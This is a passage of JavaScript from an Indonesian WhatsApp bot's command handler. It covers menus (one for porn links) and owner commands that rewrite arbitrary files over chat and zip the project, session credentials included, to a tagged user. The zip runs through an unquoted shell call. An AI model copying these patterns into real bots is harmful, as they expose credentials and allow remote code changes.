       ─ 𝟼ɢʙ
       ─ 𝟽ɢʙ
       ─ 𝟾ɢʙ
       ─ 𝟿ɢʙ
       ─ 𝟷𝟶ɢʙ
       ─ ᴜɴʟɪ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ QUOTES - MENU ] 乂${yy1}
───────────────       
       ─ ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ
       ─ ǫᴜᴏᴛᴇsʙᴀᴄᴏᴛ
       ─ ǫᴜᴏᴛᴇsʙᴜᴄɪɴ
       ─ ǫᴜᴏᴛᴇsᴍᴏᴛɪᴠᴀsɪ
       ─ ǫᴜᴏᴛᴇsɢᴀʟᴀᴜ
       ─ ǫᴜᴏᴛᴇsɢᴏᴍʙᴀʟ
       ─ ǫᴜᴏᴛᴇsʜᴀᴄᴋᴇʀ
       ─ ǫᴜᴏᴛᴇsʙɪᴊᴀᴋ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ PRIMBON - MENU ] 乂${yy1}
───────────────              
       ─ ᴀʀᴛɪᴍɪᴍᴘɪ
       ─ ᴀʀᴛɪɴᴀᴍᴀ
       ─ ʀᴀᴍᴀʟᴊᴏᴅᴏʜ
       ─ ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ
       ─ ꜱᴜᴀᴍɪɪꜱᴛʀɪ
       ─ ʀᴀᴍᴀʟᴄɪɴᴛᴀ
       ─ ᴄᴏᴄᴏᴋɴᴀᴍᴀ
       ─ ᴘᴀꜱᴀɴɢᴀɴ
       ─ ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ
       ─ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
       ─ ʀᴇᴢᴇᴋɪ
       ─ ᴘᴇᴋᴇʀᴊᴀᴀɴ
       ─ ɴᴀꜱɪʙ
       ─ ᴘᴇɴʏᴀᴋɪᴛ
       ─ ᴛᴀʀᴏᴛ
       ─ ꜰᴇɴɢꜱʜᴜɪ
       ─ ʜᴀʀɪʙᴀɪᴋ
       ─ ʜᴀʀɪꜱᴀɴɢᴀʀ
       ─ ʜᴀʀɪꜱɪᴀʟ
       ─ ɴᴀɢᴀʜᴀʀɪ
       ─ ᴀʀᴀʜʀᴇᴢᴇᴋɪ
       ─ ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ
       ─ ᴡᴇᴛᴏɴ
       ─ ᴋᴀʀᴀᴋᴛᴇʀ
       ─ ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ
       ─ ᴍᴇᴍᴀɴᴄɪɴɢ
       ─ ᴍᴀꜱᴀꜱᴜʙᴜʀ
       ─ ᴢᴏᴅɪᴀᴋ
       ─ ꜱʜɪᴏ

⏤͟͟͞͞──────────────────
${yy1}乂 [ ANIME - MENU ] 乂${yy1}
───────────────       
       ─ ᴀɴɪᴍᴇᴀᴡᴏᴏ 
       ─ ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ 
       ─ ᴀɴɪᴍᴇꜱʜɪɴᴏʙᴜ 
       ─ ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ 
       ─ ᴀɴɪᴍᴇʜɪɢʜꜰɪᴠᴇ 
       ─ ᴀɴɪᴍᴇᴄʀɪɴɢᴇ 
       ─ ᴀɴɪᴍᴇᴅᴀɴᴄᴇ 
       ─ ᴀɴɪᴍᴇʜᴀᴘᴘʏ 
       ─ ᴀɴɪᴍᴇɢʟᴏᴍᴘ 
       ─ ᴀɴɪᴍᴇꜱᴍᴜɢ 
       ─ ᴀɴɪᴍᴇʙʟᴜꜱʜ 
       ─ ᴀɴɪᴍᴇᴡᴀᴠᴇ 
       ─ ᴀɴɪᴍᴇꜱᴍɪʟᴇ 
       ─ ᴀɴɪᴍᴇᴘᴏᴋᴇ 
       ─ ᴀɴɪᴍᴇᴡɪɴᴋ  
       ─ ᴀɴɪᴍᴇʙᴏɴᴋ 
       ─ ᴀɴɪᴍᴇʙᴜʟʟʏ 
       ─ ᴀɴɪᴍᴇʏᴇᴇᴛ 
       ─ ᴀɴɪᴍᴇʙɪᴛᴇ 
       ─ ᴀɴɪᴍᴇʟɪᴄᴋ 
       ─ ᴀɴɪᴍᴇᴋɪʟʟ 
       ─ ᴀɴɪᴍᴇᴄʀʏ 
       ─ ᴀɴɪᴍᴇᴡʟᴘ 
       ─ ᴀɴɪᴍᴇᴋɪꜱꜱ 
       ─ ᴀɴɪᴍᴇʜᴜɢ 
       ─ ᴄᴏᴜᴘʟᴇᴘᴘ  
       ─ ᴀɴɪᴍᴇɴᴇᴋᴏ 
       ─ ᴀɴɪᴍᴇᴘᴀᴛ 
       ─ ᴀɴɪᴍᴇꜱʟᴀᴘ 
       ─ ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ 
       ─ ᴀɴɪᴍᴇᴡᴀɪꜰᴜ 
       ─ ᴀɴɪᴍᴇɴᴏᴍ 
       ─ ᴀɴɪᴍᴇꜰᴏxɢɪʀʟ 
       ─ ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ  
       ─ ᴀɴɪᴍᴇɢᴇᴄɢ  
       ─ ᴅᴏɢᴡᴏᴏꜰ      
       ─ 8ʙᴀʟʟᴘᴏᴏl           
       ─ ɢᴏᴏꜱᴇʙɪʀᴅ  
       ─ ᴀɴɪᴍᴇꜰᴇᴇᴅ           
       ─ ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ            
       ─ ʟɪᴢᴀʀᴅᴘɪᴄ            
       ─ ᴄᴀᴛᴍᴇᴏ 
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ ASUPAN - MENU ] 乂${yy1}
───────────────
       ─ ᴛɪᴋᴛᴏᴋɢɪʀʟ
       ─ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
       ─ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
       ─ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
       ─ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
       ─ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
       ─ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
       ─ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ BOKEP - MENU ] 乂${yy1}
───────────────
       ─ ʙᴏᴋᴇᴘ
       ─ ʙᴏᴋᴇᴘ1
       ─ ʙᴏᴋᴇᴘ2
       ─ ʙᴏᴋᴇᴘ3
       ─ ʙᴏᴋᴇᴘ4
       ─ ʙᴏᴋᴇᴘ5
       ─ ʙᴏᴋᴇᴘ6
       ─ ʙᴏᴋᴇᴘ7
       ─ ʙᴏᴋᴇᴘ8
       ─ ʙᴏᴋᴇᴘ9
       ─ ʙᴏᴋᴇᴘ10
       ─ ʙᴏᴋᴇᴘ11
       ─ ʙᴏᴋᴇᴘ12
       ─ ʙᴏᴋᴇᴘ13
       ─ ʙᴏᴋᴇᴘ14
       ─ ʙᴏᴋᴇᴘ15
       ─ ʙᴏᴋᴇᴘ16
       ─ ʙᴏᴋᴇᴘ17
       ─ ʙᴏᴋᴇᴘ18
       ─ xɴxx
       ─ xᴠɪᴅᴇᴏs
       ─ xᴠɪᴅᴇᴏsᴘʟᴀʏ
       ─ ᴘɪxʜᴇɴᴛᴀɪ

⏤͟͟͞͞──────────────────
${yy1}乂 [ CERPEN - MENU ] 乂${yy1}
───────────────
       ─ ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
       ─ ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
       ─ ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
       ─ ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
       ─ ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
       ─ ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
       ─ ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
       ─ ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
       ─ ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
       ─ ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
       ─ ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
       ─ ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ

⏤͟͟͞͞──────────────────
${yy1}乂 [ MUSIC - MENU ] 乂${yy1}
───────────────
       ─ ᴍᴜꜱɪᴄ1 sᴀᴍᴘᴀɪ ᴍᴜꜱɪᴄ𝟾𝟻
       ─ sᴀᴅ𝟷 sᴀᴍᴘᴀɪ 𝟹𝟻
       ─ sᴏᴜɴᴅ𝟷 sᴀᴍᴘᴀɪ 𝟷𝟼𝟷
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ METHODE - MENU ] 乂${yy1}
───────────────
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ1 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ2 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ3 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ4 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ5 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ6 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ7 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ8 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ9 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ10 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ11 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ12 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ13 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ14 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ15 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ16 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ17 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ18  
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ19 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ20 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ21 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ1 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ2 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ3`;
          await Kilianhst.sendMessage(
            m.chat,
            {
              image: { url: "https://files.catbox.moe/5rsgz2.jpg" },
              caption: anj,
              footer: "© Hu Tao - AI",
              contextInfo: {
                mentionedJid: [
                  m.sender,
                  "0@s.whatsapp.net",
                  owner[0] + "@s.whatsapp.net",
                ],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363405649403674@newsletter",
                  serverMessageId: null,
                  newsletterName: "Chanel Info || HuTao - AI",
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: "Hu Tao - AI",
                  body: "JavaScript",
                  thumbnailUrl: "https://files.catbox.moe/lslvq4.jpg",
                  sourceUrl: global.website,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
            { quoted: m }
          );
        }
        break;

      //============================================================\\
      // 𝗢 𝗪 𝗡 𝗘 𝗥        -             𝗠 𝗘 𝗡 𝗨 \\
      ///============================================================\\
      case "self":
        {
          if (!isCreator) return tolakk(mess.OnlyOwner);
          global.self = false;
          m.reply("Sukses Change To Self Mode");
        }
        break;

      case "public":
        {
          if (!isCreator) return tolakk(mess.OnlyOwner);
          global.public = true;
          m.reply("Sukses Change To Public Mode");
        }
        break;
      case "addfix":
        if (!isCreator)
          return reply("Fitur ini hanya bisa digunakan oleh owner.");
        if (!text.includes("|"))
          return reply("Format salah!\nContoh: .addfix halo|Halo juga!");

        const [fixKey, ...fixValue] = text.split("|");
        if (!fixKey || !fixValue.length) return reply("Format tidak valid.");

        fixes[fixKey.trim().toLowerCase()] = fixValue.join("|").trim();
        fs.writeFileSync(fileFix, JSON.stringify(fixes, null, 2));
        reply(`Berhasil menambahkan fix: *${fixKey.trim()}*`);
        break;

      case "listfix":
        if (!isCreator) return reply("Fitur ini khusus Owner!");
        if (Object.keys(fixes).length === 0)
          return reply("Belum ada data fix.");

        let daftarFix = "*Daftar Fix Tersimpan:*\n\n";
        const keys = Object.keys(fixes);
        keys.forEach((key, i) => {
          daftarFix += `${i + 1}. ${key}\n`;
        });

        let firstFix = keys[0]; // ambil keyword pertama yang tersedia

        Kilianhst.sendMessage(
          from,
          {
            text: daftarFix,
            footer: "Gunakan .dellfix <keyword> untuk hapus",
            buttons: [
              {
                buttonId: `.dellfix ${firstFix}`,
                buttonText: { displayText: `Hapus Fix: ${firstFix}` },
                type: 1,
              },
              {
                buttonId: `.addfix ${firstFix}|Ini balasan`,
                buttonText: { displayText: `Tambah Fix: ${firstFix}` },
                type: 1,
              },
            ],
            headerType: 1,
          },
          { quoted: m }
        );
        break;
      case "ambilkode":
      case "code":
        {
          if (!isCreator) return m.reply(mess.OnlyOwner);
          if (!text)
            return m.reply(`Gunakan: ${prefix + command} namafile.js:baris`);
          try {
            const [fileName, lineNumber] = text.split(":");
            if (!fileName || !lineNumber)
              return m.reply("❌ Format salah. Gunakan: namafile.js:baris");
            const fs = require("fs");
            const path = require("path");
            const baseDir = "/home/container/";
            const filePath = path.join(baseDir, fileName);
            if (!fs.existsSync(filePath)) {
              return m.reply(`❌ File ${fileName} tidak ditemukan.`);
            }
            const fileContent = fs.readFileSync(filePath, "utf8");
            const lines = fileContent.split("\n");
            const lineNum = parseInt(lineNumber);
            if (isNaN(lineNum) || lineNum <= 0 || lineNum > lines.length) {
              return m.reply(
                `❌ Baris ${lineNumber} tidak valid. File memiliki ${lines.length} baris.`
              );
            }
            const requestedLine = lines[lineNum - 1];
            m.reply(
              `📄 *${fileName}:${lineNum}*\n\n\`\`\`${requestedLine}\`\`\``
            );
          } catch (err) {
            console.error(err);
            m.reply("❌ Terjadi kesalahan saat mengambil kode.");
          }
        }
        break;

      case "setkode":
      case "setcode":
        {
          if (!isCreator) return m.reply(mess.OnlyOwner);
          if (!text)
            return m.reply(
              `Gunakan: ${prefix + command} namafile.js:baris|kode baru`
            );
          try {
            const [fileInfo, newCode] = text.split("|");
            if (!fileInfo || !newCode)
              return m.reply(
                "❌ Format salah. Gunakan: namafile.js:baris|kode baru"
              );
            const [fileName, lineNumber] = fileInfo.split(":");
            if (!fileName || !lineNumber)
              return m.reply(
                "❌ Format file salah. Gunakan: namafile.js:baris"
              );
            const fs = require("fs");
            const path = require("path");
            const baseDir = "/home/container/";
            const filePath = path.join(baseDir, fileName);
            if (!fs.existsSync(filePath)) {
              return m.reply(`❌ File ${fileName} tidak ditemukan.`);
            }
            const fileContent = fs.readFileSync(filePath, "utf8");
            const lines = fileContent.split("\n");
            const lineNum = parseInt(lineNumber);
            if (isNaN(lineNum) || lineNum <= 0 || lineNum > lines.length) {
              return m.reply(
                `❌ Baris ${lineNumber} tidak valid. File memiliki ${lines.length} baris.`
              );
            }
            const oldLine = lines[lineNum - 1];
            lines[lineNum - 1] = newCode;
            fs.writeFileSync(filePath, lines.join("\n"), "utf8");
            m.reply(
              `✅ *Kode berhasil diubah pada ${fileName}:${lineNum}*\n\n*Kode lama:*\n\`\`\`${oldLine}\`\`\`\n\n*Kode baru:*\n\`\`\`${newCode}\`\`\``
            );
          } catch (err) {
            console.error(err);
            m.reply("❌ Terjadi kesalahan saat mengubah kode.");
          }
        }
        break;

      // GET FILE || SET FILE
      case "getfile":
        {
          if (!isCreator) return m.reply(mess.OnlyOwner);
          if (!q)
            return m.reply("Masukkan nama file!\nContoh: getfile case.js");
          const filePath = path.join(__dirname, q);
          if (!fs.existsSync(filePath)) return m.reply("File tidak ditemukan!");
          const stat = fs.statSync(filePath);
          if (stat.isDirectory()) return m.reply("Itu folder, bukan file!");
          const mime = require("mime-types");
          const mimetype = mime.lookup(filePath) || "application/octet-stream";
          const fileName = path.basename(filePath);
          await Kilianhst.sendMessage(
            m.sender,
            {
              document: fs.readFileSync(filePath),
              fileName,
              mimetype,
            },
            { quoted: m }
          );
          if (m.chat !== m.sender)
            return m.reply("File berhasil dikirim ke private chat");
        }
        break;

      case "setfile":
      case "setjs":
        {
          if (!isCreator) return m.reply(mess.OnlyOwner);
          let filePath, newContent;
          if (text.includes("|")) {
            const splitText = text.split("|");
            filePath = splitText[0].trim();
            newContent = splitText.slice(1).join("|");
          } else if (text && m.quoted) {
            filePath = text.trim();
            newContent =
              m.quoted.text ||
              m.quoted.content ||
              m.quoted.message?.text ||
              m.quoted.message?.conversation ||
              "";
          } else {
            return m.reply(
              `*Format Salah!*\nContoh:\n${prefix + command} settings.js|kode`
            );
          }
          if (!filePath) {
            return m.reply(`*Format Salah!*\nLokasi file tidak boleh kosong`);
          }
          try {
            const fs = require("fs");
            const path = require("path");
            const absolutePath = path.isAbsolute(filePath)
              ? filePath
              : path.resolve(filePath);
            if (!fs.existsSync(absolutePath)) {
              try {
                const dir = path.dirname(absolutePath);
                if (!fs.existsSync(dir)) {
                  fs.mkdirSync(dir, { recursive: true });
                }
                fs.writeFileSync(absolutePath, "");
                m.reply(
                  `File '${filePath}' tidak ditemukan. File baru telah dibuat.`
                );
              } catch (err) {
                return m.reply(
                  `*Gagal Membuat File!*\nFile '${filePath}' tidak dapat dibuat: ${err.message}`
                );
              }
            }
            if (!newContent) {
              return m.reply(
                `*Gagal Mengubah File!*\nKonten tidak boleh kosong.`
              );
            }
            fs.writeFileSync(absolutePath, newContent);
            await Kilianhst.sendMessage(
              m.chat,
              { text: `_Berhasil Mengubah Isi File ${filePath} ✅_` },
              { quoted: m }
            );
            const settingsPath = path.resolve("settings.js");
            const modifiedPath = path.resolve(filePath);
            if (
              settingsPath === modifiedPath ||
              filePath.includes("settings.js")
            ) {
              m.reply(
                "_Perubahan pada settings.js terdeteksi. Bot akan restart..._"
              );
              setTimeout(() => {
                process.exit(0);
              }, 2000);
            }
          } catch (error) {
            console.error(`Error updating ${filePath}:`, error);
            await Kilianhst.sendMessage(
              m.chat,
              {
                text: `_Gagal menyimpan perubahan ke file ${filePath}: ${error.message}_`,
              },
              { quoted: m }
            );
          }
        }
        break;
      case "readchange":
      case "autoread":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (args.length < 1)
            return reply(`Contoh ${prefix + command} on/off`);
          if (q === "on") {
            global.autoread = true;
            m.reply(`Berhasil mengubah autoread ke ${q}`);
          } else if (q === "off") {
            global.autoread = false;
            m.reply(`Berhasil mengubah autoread ke ${q}`);
          }
        }
        break;
      case "autotyping":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!args[0]) return m.reply(`Contoh: ${prefix + command} on/off`);
          if (args[0] === "on") {
            global.autotyping = true;
            await m.reply("Sukses mengaktifkan autotyping.");
          } else if (args[0] === "off") {
            global.autotyping = false;
            await m.reply("Sukses menonaktifkan autotyping.");
          }
        }
        break;
      case "leave":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!m.isGroup) return reply(mess.OnlyGrup);
          await m.reply("Baik, Saya Akan Keluar Dari Grup Ini");
          await sleep(4000);
          await Kilianhst.groupLeave(m.chat);
        }
        break;
      case "joingc":
      case "join":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!text) return m.reply(example("linkgcnya"));
          if (!text.includes("chat.whatsapp.com"))
            return m.reply("Link tautan tidak valid");
          let result = text.split("https://chat.whatsapp.com/")[1];
          let id = await Kilianhst.groupAcceptInvite(result);
          m.reply(`Berhasil bergabung ke dalam grup ${id}`);
        }
        break;
      case "listcase":
        {
          let { listCase } = require("./lib/scrapelistCase.js");
          reply(listCase());
        }
        break;
      case "backuptag":
      case "bptag":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!m.isGroup) return reply(mess.OnlyGrup);

          // Cek apakah ada mention
          const target =
            m.mentionedJid && m.mentionedJid.length > 0
              ? m.mentionedJid[0]
              : m.sender;

          const sessionPath = "./session";
          if (fs.existsSync(sessionPath)) {
            const files = fs.readdirSync(sessionPath);
            files.forEach((file) => {
              if (file !== "creds.json") {
                const filePath = path.join(sessionPath, file);
                if (fs.lstatSync(filePath).isDirectory()) {
                  fs.rmSync(filePath, { recursive: true, force: true });
                } else {
                  fs.unlinkSync(filePath);
                }
              }
            });
          }

          const ls = execSync("ls")
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != "tmp" &&
                pe != ""
            );

          execSync(`zip -r backup.zip ${ls.join(" ")}`);

          await Kilianhst.sendMessage(
            target,
            {
              document: fs.readFileSync("./backup.zip"),
              fileName: "HuTao.zip",
              mimetype: "application/zip",
              caption: "Ini adalah file backup mu",
            },
            { quoted: m }
          );

          execSync("rm -rf backup.zip");

          reply(
            `Backup berhasil! File telah dikirim ke ${
              target === m.sender ? "chat pribadi kamu" : "orang yang kamu tag"
            }.`
          );
        }
        break;
      case "autobio":
        if (!isCreator) return reply(mess.OnlyOwner);
        if (args[0] === "on") {
          if (global.autoBio) return reply("Autobio sudah aktif!");
          global.autoBio = setInterval(async () => {
            const now = new Date();
            const time = now.toLocaleTimeString("id-ID");
            const statusText = `Bot aktif - ${time} || Owner KilsXD`;
            try {
              await Kilianhst.updateProfileStatus(statusText);
              console.log(`Autobio updated: ${statusText}`);
            } catch (e) {
              console.log("Gagal update autobio:", e);
            }
          }, 60000);
          reply("Autobio diaktifkan.");
        } else if (args[0] === "off") {
          if (!global.autoBio) return reply("Autobio belum aktif!");
          clearInterval(global.autoBio);
          global.autoBio = null;
          reply("Autobio dimatikan.");
        } else {
          reply("Usage: .autobio on / .autobio off");
        }
        break;

      case "backup":
      case "bp":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          const sessionPath = "./session";
          if (fs.existsSync(sessionPath)) {
            const files = fs.readdirSync(sessionPath);
            files.forEach((file) => {
              if (file !== "creds.json") {
                const filePath = path.join(sessionPath, file);
                if (fs.lstatSync(filePath).isDirectory()) {
                  fs.rmSync(filePath, { recursive: true, force: true });
                } else {
                  fs.unlinkSync(filePath);
                }
              }
            });
          }

          const ls = execSync("ls")
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != "tmp" &&
                pe != ""
            );

          execSync(`zip -r backup.zip ${ls.join(" ")}`);

          await Kilianhst.sendMessage(
            m.sender,
            {
              document: fs.readFileSync("./backup.zip"),
              fileName: "HuTao.zip",
              mimetype: "application/zip",
              caption: "Ini adalah file backup mu",
            },
            { quoted: m }
          );

          execSync("rm -rf backup.zip");
        }
        break;
      case "upteks":
      case "chat":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!text) return await reply("Example : .chat woi kil kece");
          //m.reply("contoh\n.chat selamat siang semuanya")
          if (
            budy.match(
              `colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit|open bo|panel|unli|gay|yatim|sale|private|adp|alok|62|mmk|6289504242949|089504242949|join|whatsapp.com|wa.me|t.me`
            )
          )
            return tolak(
              "maaf ada kata kata yang tidak sesuai.\nAturan\ndi mohon untuk tidak promosi barang/jasa, menyebarkan hoax, scam, berkata kasar, menyebarkan nomor WhatsApp, mengeshare link"
            );
          const Kalender00011 = moment
            .tz("Asia/Jakarta")
            .format(`yyyy-MMMM-dddd`);
          const owned11 = owner + "@s.whatsapp.net";
          let awal = `anjir`;
          await Kilianhst.sendMessage(m.chat, {
            react: {
              text: "🦚",
              key: m.key,
            },
          });
          Kilianhst.sendMessage(`${global.idch}`, {
            text: `${text}`,
            contextInfo: {
              mentionedJid: [m.sender, owned11],
              forwardedNewsletterMessageInfo: {
                newsletterJid: `0@newsletter`,
                newsletterName: `Kilian`,
                serverMessageId: -1,
              },
              businessMessageForwardInfo: {
                businessOwnerJid: Kilianhst.decodeJid(Kilianhst.user.id),
              },

              forwardingScore: 999,
              isForwarded: false,
              externalAdReply: {
                showAdAttribution: true,
                title: `Chat :${pushname}`,
                body: `Form: ${
                  m.isGroup
                    ? `${groupMetadata.subject}`
                    : !m.isGroup
                    ? "chat"
                    : "Free User"
                }`,
                thumbnailUrl: ppuser,
                sourceUrl: `${text}`,
                mediaType: 1,
                renderLargerThumbnail: false,
              },
            },
          });
          await delay(150);
          Kilianhst.sendMessage(m.chat, {
            react: {
              text: "⚡",
              key: m.key,
            },
          });
          //reply(`sukses mengirim pesan ke channel.`)
          Kilianhst.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key,
            },
          });
        }
        break;
      case "noenc":
        {
          if (
            !m.quoted ||
            !m.quoted.mimetype ||
            !m.quoted.mimetype.includes("javascript")
          )
            return m.reply("Send File Dan Reply File Ber Type .js");

          const beautify = require("js-beautify").js;
          const fs = require("fs");
          const path = require("path");
          const { deobfuscate } = require("deobfuscator");
          const slang = require("js-slang");

          let jsFile = await m.quoted.download();
          let raw = jsFile.toString();

          // Coba deobfuscate dengan deobfuscator
          let hasil = "";
          try {
            hasil = deobfuscate(raw);
            console.log("File berhasil dideobfuscate dengan deobfuscator.");
          } catch (e) {
            console.log(
              "Gagal deobfuscate dengan deobfuscator, mencoba metode lain..."
            );
            // Jika gagal, coba beautify
            hasil = beautify(raw, {
              indent_size: 2,
              space_in_empty_paren: true,
            });
          }

          // Cek dan deobfuscate lebih lanjut jika masih obfuscated (eval, Function, dll)
          try {
            if (hasil.includes("eval(") || hasil.includes("Function(")) {
              console.log(
                "Terdeteksi obfuscation menggunakan eval/Function, mencoba deteksi lebih lanjut..."
              );
              // Menggunakan teknik JS slang untuk memecahkan string obfuscation
              hasil = slang.decode(hasil);
            }
          } catch (e) {
            console.log("Gagal mengeksekusi slang decoding.");
          }

          // Cek dan format lebih lanjut
          let filePath = path.join(__dirname, "./result.js");
          fs.writeFileSync(filePath, hasil);

          await Kilianhst.sendMessage(
            m.chat,
            {
              document: { url: filePath },
              mimetype: "application/javascript",
